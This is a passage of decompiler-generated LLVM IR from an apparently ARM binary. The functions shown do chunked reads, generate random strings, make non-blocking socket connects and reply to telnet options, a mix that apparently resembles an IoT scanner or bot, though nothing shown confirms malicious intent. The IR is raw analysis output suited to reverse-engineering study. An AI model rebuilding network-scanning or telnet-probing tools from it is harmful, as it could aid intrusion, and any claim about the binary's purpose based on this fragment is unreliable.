  %v2_9920 = call i32 @function_12308(i32 %v4_986c, i32 46)
  %v2_9928 = icmp eq i32 %v2_9920, 0
  br i1 %v2_9928, label %dec_label_pc_994c, label %dec_label_pc_9930

dec_label_pc_9930:                                ; preds = %dec_label_pc_9914
  store i32 %v4_986c, i32* @r0, align 4
  %v2_993c = call i32 @function_12308(i32 %v4_986c, i32 46)
  %v3_9948 = inttoptr i32 %v2_993c to i8*
  store i8 0, i8* %v3_9948, align 1
  br label %dec_label_pc_994c

dec_label_pc_994c:                                ; preds = %dec_label_pc_9914, %dec_label_pc_9930
  store i32 %v4_986c, i32* @r1, align 4
  %v2_9968 = inttoptr i32 %arg1 to i8*
  %v3_9968 = call i32 @function_12228(i8* %v2_9968, i32 %v4_986c)
  %v1_9970 = call i32 @function_108d0(i32 %v3_97f0)
  br label %dec_label_pc_99dc

dec_label_pc_9984:                                ; preds = %dec_label_pc_9800
  store i32 4096, i32* @r2, align 4
  %v3_999c = call i32 @function_11f30(i8* %v1_9810, i32 0)
  br label %dec_label_pc_99a0

dec_label_pc_99a0:                                ; preds = %dec_label_pc_97c4, %dec_label_pc_9984
  %v4_99b8 = call i32 @function_93f8(i32 %v2_99a8, i32 4096, i32 %v3_97f0, i32 %v2_99a8)
  %v2_99c0 = icmp eq i32 %v4_99b8, 0
  br i1 %v2_99c0, label %dec_label_pc_99c8, label %dec_label_pc_9800

dec_label_pc_99c8:                                ; preds = %dec_label_pc_99a0
  %v1_99cc = call i32 @function_108d0(i32 %v3_97f0)
  br label %dec_label_pc_99dc

dec_label_pc_99dc:                                ; preds = %dec_label_pc_994c, %dec_label_pc_99c8
  %storemerge4 = phi i32 [ 1, %dec_label_pc_99c8 ], [ 0, %dec_label_pc_994c ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_98c8, { 2, 1, 0 }
  uselistorder i32 %v4_986c, { 3, 2, 1, 0, 5, 4, 6, 9, 7, 8, 10 }
  uselistorder i8* %storemerge2, { 0, 1, 3, 2 }
  uselistorder i32 %v2_99a8, { 0, 3, 1, 2 }
  uselistorder i32 %v3_97f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_99dc, { 1, 0 }
  uselistorder label %dec_label_pc_99a0, { 1, 0 }
  uselistorder label %dec_label_pc_994c, { 1, 0 }
  uselistorder label %dec_label_pc_98c4, { 1, 0 }
  uselistorder label %dec_label_pc_986c, { 1, 0 }
}

define i32 @function_99fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_99fc:
  %stack_var_-4120 = alloca i32, align 4
  %v2_9a0c = ptrtoint i32* %stack_var_-4120 to i32
  store i32 0, i32* @r3, align 4
  %v3_9a20 = call i32 @function_10474(i32 ptrtoint ([14 x i8]* @global_var_19e48.40 to i32), i32 0)
  %v1_9a40 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9a9c

dec_label_pc_9a30:                                ; preds = %dec_label_pc_9a9c
  %v2_9a40 = call i32 @function_9764(i8* %v1_9a40)
  %v4_9a58 = call i32 @function_12060(i32 %v2_9a0c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e58.42, i32 0, i32 0))
  %v9_9a6c = icmp eq i32 %v4_9a58, %v2_9a0c
  br i1 %v9_9a6c, label %dec_label_pc_9a74, label %dec_label_pc_9a80

dec_label_pc_9a74:                                ; preds = %dec_label_pc_9a30
  %v1_9a78 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9a80

dec_label_pc_9a80:                                ; preds = %dec_label_pc_9a30, %dec_label_pc_9a74
  %stack_var_-24.0 = phi i32 [ %v1_9a78, %dec_label_pc_9a74 ], [ %stack_var_-24.1, %dec_label_pc_9a30 ]
  store i32 4096, i32* @r2, align 4
  %v3_9a98 = call i32 @function_11f30(i8* %v1_9a40, i32 0)
  br label %dec_label_pc_9a9c

dec_label_pc_9a9c:                                ; preds = %dec_label_pc_99fc, %dec_label_pc_9a80
  %stack_var_-24.1 = phi i32 [ 0, %dec_label_pc_99fc ], [ %stack_var_-24.0, %dec_label_pc_9a80 ]
  %v4_9ab4 = call i32 @function_93f8(i32 %v2_9a0c, i32 4096, i32 %v3_9a20, i32 %v2_9a0c)
  %v2_9abc = icmp eq i32 %v4_9ab4, 0
  br i1 %v2_9abc, label %dec_label_pc_9ac4, label %dec_label_pc_9a30

dec_label_pc_9ac4:                                ; preds = %dec_label_pc_9a9c
  %v1_9ac8 = call i32 @function_108d0(i32 %v3_9a20)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_9a0c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9a9c, { 1, 0 }
  uselistorder label %dec_label_pc_9a80, { 1, 0 }
}

define i32 @function_9ae8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9ae8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_9aec = load i32, i32* @r4, align 4
  %v6_9aec = load i32, i32* @fp, align 4
  %v0_9af8 = load i32, i32* %r0.global-to-local, align 4
  %v5_9b8c24 = icmp sgt i32 %arg2, 0
  br i1 %v5_9b8c24, label %dec_label_pc_9b14, label %dec_label_pc_9b90

dec_label_pc_9b14:                                ; preds = %dec_label_pc_9ae8, %dec_label_pc_9b14
  %storemerge725 = phi i32 [ %v1_9b78, %dec_label_pc_9b14 ], [ 0, %dec_label_pc_9ae8 ]
  %v2_9b20 = add i32 %storemerge725, %v0_9af8
  store i32 %v2_9b20, i32* @r4, align 4
  %v0_9b24 = call i32 @function_8440()
  store i32 %v0_9b24, i32* %r0.global-to-local, align 4
  %v3_9b34 = udiv i32 %v0_9b24, 26
  %tmp = mul nsw i32 %v3_9b34, -2
  %v2_9b58 = add i32 %v0_9b24, %tmp
  %fold = add i32 %v2_9b58, 65
  %v1_9b70 = trunc i32 %fold to i8
  %v2_9b70 = load i32, i32* @r4, align 4
  %v3_9b70 = inttoptr i32 %v2_9b70 to i8*
  store i8 %v1_9b70, i8* %v3_9b70, align 1
  %v1_9b78 = add nuw nsw i32 %storemerge725, 1
  %v5_9b8c = icmp slt i32 %v1_9b78, %arg2
  br i1 %v5_9b8c, label %dec_label_pc_9b14, label %dec_label_pc_9b80.dec_label_pc_9b90_crit_edge

dec_label_pc_9b80.dec_label_pc_9b90_crit_edge:    ; preds = %dec_label_pc_9b14
  %v1_9b98.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9b90

dec_label_pc_9b90:                                ; preds = %dec_label_pc_9b80.dec_label_pc_9b90_crit_edge, %dec_label_pc_9ae8
  %v1_9b98 = phi i32 [ %v1_9b98.pre, %dec_label_pc_9b80.dec_label_pc_9b90_crit_edge ], [ %v0_9af8, %dec_label_pc_9ae8 ]
  store i32 %v3_9aec, i32* @r4, align 4
  store i32 %v6_9aec, i32* @fp, align 4
  ret i32 %v1_9b98

; uselistorder directives
  uselistorder i32 %v1_9b78, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9b14, { 1, 0 }
}

define i32 @function_9ba0(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9bf4.lr.ph:
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9ba4 = load i32, i32* @fp, align 4
  store i32 %v3_9ba4, i32* %stack_var_-16, align 4
  store i32 39852, i32* %stack_var_-4, align 4
  %v2_9ba8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ba8, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9bcc = call i32 @function_11f30(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9be0 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bf4.lr.ph, %dec_label_pc_9bf4
  %storemerge628 = phi i32 [ 0, %dec_label_pc_9bf4.lr.ph ], [ %v1_9c08, %dec_label_pc_9bf4 ]
  %v5_9c00 = mul nuw nsw i32 %storemerge628, 4
  %v6_9c00 = add i32 %v5_9c00, %v2_9be0
  %v7_9c00 = inttoptr i32 %v6_9c00 to i32*
  store i32 0, i32* %v7_9c00, align 4
  %v1_9c08 = add nuw nsw i32 %storemerge628, 1
  %tmp53 = icmp ult i32 %v1_9c08, 32
  br i1 %tmp53, label %dec_label_pc_9bf4, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9bf4
  %v13_9ba4 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9c20 = udiv i32 %arg1, 32
  %v3_9c2c = mul nuw nsw i32 %v3_9c20, 4
  %v2_9c34 = add nsw i32 %v3_9c2c, -160
  %v2_9c38 = add i32 %v2_9c34, %v13_9ba4
  %v1_9c3c = inttoptr i32 %v2_9c38 to i32*
  %v2_9c3c = load i32, i32* %v1_9c3c, align 4
  %v1_9c44 = urem i32 %arg1, 32
  %v6_9c4c = shl i32 1, %v1_9c44
  %v2_9c50 = or i32 %v2_9c3c, %v6_9c4c
  store i32 %v2_9c50, i32* %v1_9c3c, align 4
  %v1_9c70 = add i32 %arg1, 1
  %v2_9c7c = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9c90 = call i32 @function_1059c(i32 %v1_9c70, i32 %v2_9be0, i32 0, i32 %v2_9be0, i32 %v2_9c7c)
  %v5_9ca4 = icmp sgt i32 %v5_9c90, 0
  br i1 %v5_9ca4, label %dec_label_pc_9e38.preheader, label %dec_label_pc_9da4.preheader

dec_label_pc_9da4.preheader:                      ; preds = %dec_label_pc_9c1c
  %v7_9dac24 = icmp slt i32 %tmp34, 10
  br i1 %v7_9dac24, label %dec_label_pc_9ce4.lr.ph, label %dec_label_pc_9e38.preheader

dec_label_pc_9ce4.lr.ph:                          ; preds = %dec_label_pc_9da4.preheader, %dec_label_pc_9d98
  %stack_var_-44.025 = phi i32 [ %v1_9d9c, %dec_label_pc_9d98 ], [ %tmp34, %dec_label_pc_9da4.preheader ]
  %v2_9cb0 = load i32, i32* @global_var_23700.47, align 4
  %v3_9cbc = call i32 @function_8f1c(i32 %v2_9cb0, i32 ptrtoint ([5 x i8]* @global_var_19e64.49 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9ce4

dec_label_pc_9ce4:                                ; preds = %dec_label_pc_9ce4.lr.ph, %dec_label_pc_9ce4
  %storemerge716 = phi i32 [ 0, %dec_label_pc_9ce4.lr.ph ], [ %v1_9cf8, %dec_label_pc_9ce4 ]
  %v5_9cf0 = mul nuw nsw i32 %storemerge716, 4
  %v6_9cf0 = add i32 %v5_9cf0, %v2_9be0
  %v7_9cf0 = inttoptr i32 %v6_9cf0 to i32*
  store i32 0, i32* %v7_9cf0, align 4
  %v1_9cf8 = add nuw nsw i32 %storemerge716, 1
  %tmp54 = icmp ult i32 %v1_9cf8, 32
  br i1 %tmp54, label %dec_label_pc_9ce4, label %dec_label_pc_9d0c

dec_label_pc_9d0c:                                ; preds = %dec_label_pc_9ce4
  %v2_9d2c = load i32, i32* %v1_9c3c, align 4
  %v2_9d40 = or i32 %v2_9d2c, %v6_9c4c
  store i32 %v2_9d40, i32* %v1_9c3c, align 4
  store i32 0, i32* @r2, align 4
  %v5_9d80 = call i32 @function_1059c(i32 %v1_9c70, i32 %v2_9be0, i32 0, i32 %v2_9be0, i32 %v2_9c7c)
  %v5_9d94 = icmp sgt i32 %v5_9d80, 0
  br i1 %v5_9d94, label %dec_label_pc_9e38.preheader, label %dec_label_pc_9d98

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9d0c
  %v1_9d9c = add nsw i32 %stack_var_-44.025, 1
  %v7_9dac = icmp slt i32 %v1_9d9c, 10
  br i1 %v7_9dac, label %dec_label_pc_9ce4.lr.ph, label %dec_label_pc_9e38.preheader

dec_label_pc_9e38.preheader:                      ; preds = %dec_label_pc_9d98, %dec_label_pc_9d0c, %dec_label_pc_9da4.preheader, %dec_label_pc_9c1c
  %v2_9dcc = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_9e4058 = icmp sgt i32 %arg3, 1
  %v2_9e5860 = icmp eq i1 %not.v7_9e4058, false
  br i1 %v2_9e5860, label %dec_label_pc_9e60, label %dec_label_pc_9dc4

dec_label_pc_9dc4:                                ; preds = %dec_label_pc_9e38.preheader, %dec_label_pc_9e2c
  %v1_9e3c63.in = phi i32 [ %v1_9e3c63, %dec_label_pc_9e2c ], [ %arg3, %dec_label_pc_9e38.preheader ]
  %stack_var_-40.062 = phi i8* [ %v5_9e1c, %dec_label_pc_9e2c ], [ %arg2, %dec_label_pc_9e38.preheader ]
  %stack_var_-36.061 = phi i32 [ %v1_9e30, %dec_label_pc_9e2c ], [ 0, %dec_label_pc_9e38.preheader ]
  %v1_9e3c63 = add i32 %v1_9e3c63.in, -1
  %v2_9dc8 = load i32, i32* @global_var_23700.47, align 4
  %v5_9de0 = call i32 @function_127c4(i32 %v2_9dc8, i32 %v2_9dcc, i32 1, i32 0, i32 %v1_9e3c63)
  %v7_9de8 = icmp eq i32 %v5_9de0, 1
  br i1 %v7_9de8, label %dec_label_pc_9e08, label %dec_label_pc_9df0

dec_label_pc_9df0:                                ; preds = %dec_label_pc_9dc4
  store i8 0, i8* %stack_var_-40.062, align 1
  br label %dec_label_pc_9e74

dec_label_pc_9e08:                                ; preds = %dec_label_pc_9dc4
  %v3_9e08 = load i8, i8* %stack_var_-185, align 1
  %v4_9e0c = ptrtoint i8* %stack_var_-40.062 to i32
  store i8 %v3_9e08, i8* %stack_var_-40.062, align 1
  %v1_9e18 = add i32 %v4_9e0c, 1
  %v5_9e1c = inttoptr i32 %v1_9e18 to i8*
  %v3_9e20 = load i8, i8* %stack_var_-185, align 1
  %v7_9e24 = icmp eq i8 %v3_9e20, 10
  br i1 %v7_9e24, label %dec_label_pc_9e60, label %dec_label_pc_9e2c

dec_label_pc_9e2c:                                ; preds = %dec_label_pc_9e08
  %v1_9e30 = add i32 %stack_var_-36.061, 1
  %not.v7_9e40 = icmp sgt i32 %v1_9e3c63, 1
  %v2_9e58 = icmp eq i1 %not.v7_9e40, false
  br i1 %v2_9e58, label %dec_label_pc_9e60, label %dec_label_pc_9dc4

dec_label_pc_9e60:                                ; preds = %dec_label_pc_9e08, %dec_label_pc_9e2c, %dec_label_pc_9e38.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9e38.preheader ], [ %v1_9e30, %dec_label_pc_9e2c ], [ %stack_var_-36.061, %dec_label_pc_9e08 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9e38.preheader ], [ %v5_9e1c, %dec_label_pc_9e2c ], [ %v5_9e1c, %dec_label_pc_9e08 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9e74

dec_label_pc_9e74:                                ; preds = %dec_label_pc_9df0, %dec_label_pc_9e60
  %storemerge = phi i32 [ -1, %dec_label_pc_9df0 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9e60 ]
  %v2_9e80 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9e80, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9e3c63, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.062, { 1, 2, 0 }
  uselistorder i32 %v1_9d9c, { 1, 0 }
  uselistorder i32 %storemerge716, { 1, 0 }
  uselistorder i32 %storemerge628, { 1, 0 }
  uselistorder i32 %v2_9be0, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9e74, { 1, 0 }
  uselistorder label %dec_label_pc_9e60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9dc4, { 1, 0 }
  uselistorder label %dec_label_pc_9ce4, { 1, 0 }
  uselistorder label %dec_label_pc_9ce4.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9bf4, { 1, 0 }
}

define i32 @function_9e90(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9e90:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9e94 = load i32, i32* @fp, align 4
  store i32 %v3_9e94, i32* %stack_var_-16, align 4
  %v13_9e94 = ptrtoint i32* %stack_var_-16 to i32
  %v2_9ebc = call i32 @function_106d8(i32 %arg1, i32 3)
  %v1_9ecc = or i32 %v2_9ebc, 2048
  store i32 %v1_9ecc, i32* @r3, align 4
  %v2_9ee0 = call i32 @function_106d8(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9ef4 = urem i32 %arg3, 65536
  %v1_9efc = call i32 @function_125e0(i32 %v3_9ef4)
  %v3_9f1c = call i32 @function_96fc(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9f24 = icmp eq i32 %v3_9f1c, 0
  br i1 %v2_9f24, label %dec_label_pc_9f38, label %dec_label_pc_9f2c

dec_label_pc_9f2c:                                ; preds = %dec_label_pc_9e90
  br label %dec_label_pc_a0f0

dec_label_pc_9f38:                                ; preds = %dec_label_pc_9e90
  store i32 8, i32* @r2, align 4
  %v2_9f4c = bitcast i32* %stack_var_-40 to i8*
  %v3_9f4c = call i32 @function_11f30(i8* %v2_9f4c, i32 0)
  %v2_9f50 = ptrtoint i32* %stack_var_-48 to i32
  %v3_9f60 = call i32 @function_12710(i32 %arg1, i32 %v2_9f50, i32 16)
  store i32 %v3_9f60, i32* @r3, align 4
  %v1_9f70 = icmp slt i32 %v3_9f60, 0
  br i1 %v1_9f70, label %dec_label_pc_9f78, label %dec_label_pc_a0b4

dec_label_pc_9f78:                                ; preds = %dec_label_pc_9f38
  %v0_9f78 = call i32 @function_1095c()
  %v1_9f80 = inttoptr i32 %v0_9f78 to i32*
  %v2_9f80 = load i32, i32* %v1_9f80, align 4
  %v7_9f84 = icmp eq i32 %v2_9f80, 115
  br i1 %v7_9f84, label %dec_label_pc_9fb0.lr.ph, label %dec_label_pc_a0a8

dec_label_pc_9fb0.lr.ph:                          ; preds = %dec_label_pc_9f78
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9f9c = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9fb0

dec_label_pc_9fb0:                                ; preds = %dec_label_pc_9fb0.lr.ph, %dec_label_pc_9fb0
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9fb0.lr.ph ], [ %v1_9fc4, %dec_label_pc_9fb0 ]
  %v5_9fbc = mul nuw nsw i32 %storemerge14, 4
  %v6_9fbc = add i32 %v5_9fbc, %v2_9f9c
  %v7_9fbc = inttoptr i32 %v6_9fbc to i32*
  store i32 0, i32* %v7_9fbc, align 4
  %v1_9fc4 = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_9fc4, 32
  br i1 %tmp28, label %dec_label_pc_9fb0, label %dec_label_pc_9fd8

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fb0
  %v3_9fdc = udiv i32 %arg1, 32
  %v3_9fe8 = mul nuw nsw i32 %v3_9fdc, 4
  %v2_9ff0 = add nsw i32 %v3_9fe8, -160
  %v2_9ff4 = add i32 %v2_9ff0, %v13_9e94
  %v1_9ff8 = inttoptr i32 %v2_9ff4 to i32*
  %v2_9ff8 = load i32, i32* %v1_9ff8, align 4
  %v1_a000 = urem i32 %arg1, 32
  %v6_a008 = shl i32 1, %v1_a000
  %v2_a00c = or i32 %v2_9ff8, %v6_a008
  store i32 %v2_a00c, i32* %v1_9ff8, align 4
  %v1_a02c = add i32 %arg1, 1
  store i32 %v2_9f9c, i32* @ip, align 4
  %v2_a034 = ptrtoint i32* %stack_var_-184 to i32
  %v5_a04c = call i32 @function_1059c(i32 %v1_a02c, i32 0, i32 %v2_9f9c, i32 0, i32 %v2_a034)
  %tmp29 = icmp slt i32 %v5_a04c, 1
  br i1 %tmp29, label %dec_label_pc_a09c, label %dec_label_pc_a05c

dec_label_pc_a05c:                                ; preds = %dec_label_pc_9fd8
  store i32 4, i32* %stack_var_-188, align 4
  %v2_a064 = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_a064, i32* @ip, align 4
  %v2_a068 = ptrtoint i32* %stack_var_-188 to i32
  %v5_a080 = call i32 @function_12780(i32 %arg1, i32 1, i32 4, i32 %v2_a064, i32 %v2_a068)
  %v3_a084 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_a084, i32* @r3, align 4
  %v2_a088 = icmp eq i32 %v3_a084, 0
  br i1 %v2_a088, label %dec_label_pc_a0b4, label %dec_label_pc_a090

dec_label_pc_a090:                                ; preds = %dec_label_pc_a05c
  br label %dec_label_pc_a0f0

dec_label_pc_a09c:                                ; preds = %dec_label_pc_9fd8
  br label %dec_label_pc_a0f0

dec_label_pc_a0a8:                                ; preds = %dec_label_pc_9f78
  br label %dec_label_pc_a0f0

dec_label_pc_a0b4:                                ; preds = %dec_label_pc_9f38, %dec_label_pc_a05c
  %v2_a0c0 = call i32 @function_106d8(i32 %arg1, i32 3)
  %v1_a0d0 = and i32 %v2_a0c0, -2049
  store i32 %v1_a0d0, i32* @r3, align 4
  %v2_a0e4 = call i32 @function_106d8(i32 %arg1, i32 4)
  br label %dec_label_pc_a0f0

dec_label_pc_a0f0:                                ; preds = %dec_label_pc_a0a8, %dec_label_pc_a09c, %dec_label_pc_a090, %dec_label_pc_9f2c, %dec_label_pc_a0b4
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a09c ], [ 1, %dec_label_pc_a0b4 ], [ 0, %dec_label_pc_a090 ], [ 0, %dec_label_pc_a0a8 ], [ 0, %dec_label_pc_9f2c ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9f9c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a0f0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a0b4, { 1, 0 }
  uselistorder label %dec_label_pc_9fb0, { 1, 0 }
}

define i32 @function_a104() local_unnamed_addr {
dec_label_pc_a104:
  %stack_var_-4 = alloca i32, align 4
  %v3_a108 = load i32, i32* @r4, align 4
  %v6_a108 = load i32, i32* @r5, align 4
  %v9_a108 = load i32, i32* @r6, align 4
  %v12_a108 = load i32, i32* @fp, align 4
  store i32 41232, i32* %stack_var_-4, align 4
  %v2_a10c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a10c, i32* @fp, align 4
  %v0_a114 = call i32 @function_1054c()
  %v2_a124 = icmp eq i32 %v0_a114, 0
  br i1 %v2_a124, label %dec_label_pc_a290, label %dec_label_pc_a138

dec_label_pc_a138:                                ; preds = %dec_label_pc_a104
  %v2_a13c = load i32, i32* @global_var_23708.51, align 4
  %v5_a13c = load i32, i32* @global_var_2370c.52, align 4
  %v2_a148 = add i32 %v2_a13c, 1
  %v3_a148 = icmp eq i32 %v2_a148, 0
  %v4_a14c = zext i1 %v3_a148 to i32
  %v5_a14c = add i32 %v4_a14c, %v5_a13c
  store i32 %v2_a148, i32* @global_var_23708.51, align 4
  store i32 %v5_a14c, i32* @global_var_2370c.52, align 4
  %v2_a168 = add i32 %v2_a13c, 2
  %v3_a168 = icmp eq i32 %v2_a148, -1
  %v4_a16c = zext i1 %v3_a168 to i32
  %v5_a16c = add i32 %v5_a14c, %v4_a16c
  %v3_a170 = udiv i32 %v2_a168, 1073741824
  %v3_a174 = mul i32 %v5_a16c, 4
  %v2_a178 = or i32 %v3_a174, %v3_a170
  store i32 %v2_a178, i32* @r4, align 4
  %v3_a17c = mul i32 %v2_a168, 4
  %v1_a184 = call i32 @function_12b00(i32 %v3_a17c)
  br label %dec_label_pc_a1dc

dec_label_pc_a19c:                                ; preds = %dec_label_pc_a1dc, %dec_label_pc_a228
  %v3_a1a0 = mul i32 %storemerge2, 4
  %v2_a1ac = add i32 %v3_a1a0, %v1_a184
  %v2_a1c0 = load i32, i32* @global_var_29778.54, align 4
  %v2_a1c4 = add i32 %v2_a1c0, %v3_a1a0
  %v1_a1c8 = inttoptr i32 %v2_a1c4 to i32*
  %v2_a1c8 = load i32, i32* %v1_a1c8, align 4
  %v2_a1cc = inttoptr i32 %v2_a1ac to i32*
  store i32 %v2_a1c8, i32* %v2_a1cc, align 4
  %v1_a1d4 = add i32 %storemerge2, 1
  br label %dec_label_pc_a1dc

dec_label_pc_a1dc:                                ; preds = %dec_label_pc_a138, %dec_label_pc_a19c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a138 ], [ %v1_a1d4, %dec_label_pc_a19c ]
  %v2_a1f4 = load i32, i32* @global_var_23708.51, align 4
  %v5_a1f4 = load i32, i32* @global_var_2370c.52, align 4
  %v2_a208 = add i32 %v2_a1f4, -1
  %v3_a208 = icmp ne i32 %v2_a1f4, 0
  %v3_a20c = add i32 %v5_a1f4, -1
  %v5_a20c = sext i1 %v3_a208 to i32
  %v9_a220 = icmp eq i32 %v3_a20c, %v5_a20c
  br i1 %v9_a220, label %dec_label_pc_a228, label %dec_label_pc_a19c

dec_label_pc_a228:                                ; preds = %dec_label_pc_a1dc
  store i32 %v2_a208, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a208, %storemerge2
  br i1 %tmp, label %dec_label_pc_a19c, label %dec_label_pc_a248

dec_label_pc_a248:                                ; preds = %dec_label_pc_a228
  store i32 %v5_a1f4, i32* @r4, align 4
  %v3_a250 = mul i32 %v2_a1f4, 4
  %v1_a254 = add i32 %v1_a184, -4
  %v2_a260 = add i32 %v1_a254, %v3_a250
  %v2_a268 = inttoptr i32 %v2_a260 to i32*
  store i32 %v0_a114, i32* %v2_a268, align 4
  %v2_a270 = load i32, i32* @global_var_29778.54, align 4
  store i32 %v2_a270, i32* @r0, align 4
  %v0_a278 = call i32 @function_13684()
  store i32 %v1_a184, i32* @global_var_29778.54, align 4
  br label %dec_label_pc_a290

dec_label_pc_a290:                                ; preds = %dec_label_pc_a104, %dec_label_pc_a248
  store i32 %v3_a108, i32* @r4, align 4
  store i32 %v6_a108, i32* @r5, align 4
  store i32 %v9_a108, i32* @r6, align 4
  store i32 %v12_a108, i32* @fp, align 4
  ret i32 %v0_a114

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a1a0, { 1, 0 }
  uselistorder i32 %v1_a184, { 2, 0, 1 }
  uselistorder i32 %v2_a148, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a290, { 1, 0 }
  uselistorder label %dec_label_pc_a1dc, { 1, 0 }
  uselistorder label %dec_label_pc_a19c, { 1, 0 }
}

define i32 @function_a2ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_a2ac:
  %stack_var_-17 = alloca i8, align 1
  %v1_a2cc = add i32 %arg2, 1
  %v1_a2d0 = inttoptr i32 %v1_a2cc to i8*
  %v2_a2d0 = load i8, i8* %v1_a2d0, align 1
  %v7_a2dc = icmp ult i8 %v2_a2d0, -5
  br i1 %v7_a2dc, label %dec_label_pc_a428, label %dec_label_pc_a2e4

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a2ac
  %v7_a2ec = icmp eq i8 %v2_a2d0, -1
  br i1 %v7_a2ec, label %dec_label_pc_a2f0, label %dec_label_pc_a30c

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2e4
  br label %dec_label_pc_a428

dec_label_pc_a30c:                                ; preds = %dec_label_pc_a2e4
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a314 = ptrtoint i8* %stack_var_-17 to i32
  %v5_a328 = call i32 @function_127fc(i32 %arg1, i32 %v2_a314, i32 1, i32 16384)
  %v2_a334 = load i8, i8* %v1_a2d0, align 1
  %v7_a338 = icmp eq i8 %v2_a334, -4
  br i1 %v7_a338, label %dec_label_pc_a340, label %dec_label_pc_a34c

dec_label_pc_a340:                                ; preds = %dec_label_pc_a30c
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3ec

dec_label_pc_a34c:                                ; preds = %dec_label_pc_a30c
  %v2_a354 = load i8, i8* %v1_a2d0, align 1
  %v7_a358 = icmp eq i8 %v2_a354, -2
  br i1 %v7_a358, label %dec_label_pc_a360, label %dec_label_pc_a36c

dec_label_pc_a360:                                ; preds = %dec_label_pc_a34c
